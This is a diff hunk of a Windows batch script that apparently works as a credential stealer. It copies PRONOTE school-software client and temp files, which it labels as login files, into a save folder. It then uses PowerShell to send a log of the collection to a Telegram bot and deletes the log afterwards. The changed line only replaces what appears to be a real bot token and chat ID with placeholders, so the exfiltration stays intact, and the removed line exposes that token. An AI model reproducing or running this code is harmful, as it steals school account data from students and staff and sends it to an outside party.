@@ -66,6 +66,6 @@ xcopy "C:\Program Files (x86)\Index Education\PRONOTE\*" "%SAVE_DIR%\Client_File
 xcopy "%TEMP%\Index Education\PRONOTE\*" "%SAVE_DIR%\Temp_Files\" /E /I /H /Y
 echo Fichiers de connexion Pronote sauvegardés dans %SAVE_DIR% >> temp_info.txt
 echo. >> temp_info.txt
-powershell -Command "$apiToken = '7612447796:AAFA_rdZLmdh_FVbyGFYQgMeGt3t6Oboers'; $chatId = '-1002469431860'; $message = Get-Content -Path 'temp_info.txt' -Raw; Invoke-RestMethod -Uri "https://api.telegram.org/bot$apiToken/sendMessage" -Method Post -ContentType 'application/json' -Body (@{chat_id=$chatId; text=$message} | ConvertTo-Json -Depth 3)"
+powershell -Command "$apiToken = 'your telegram bot api'; $chatId = 'your chat id'; $message = Get-Content -Path 'temp_info.txt' -Raw; Invoke-RestMethod -Uri "https://api.telegram.org/bot$apiToken/sendMessage" -Method Post -ContentType 'application/json' -Body (@{chat_id=$chatId; text=$message} | ConvertTo-Json -Depth 3)"
 del temp_info.txt
 exit
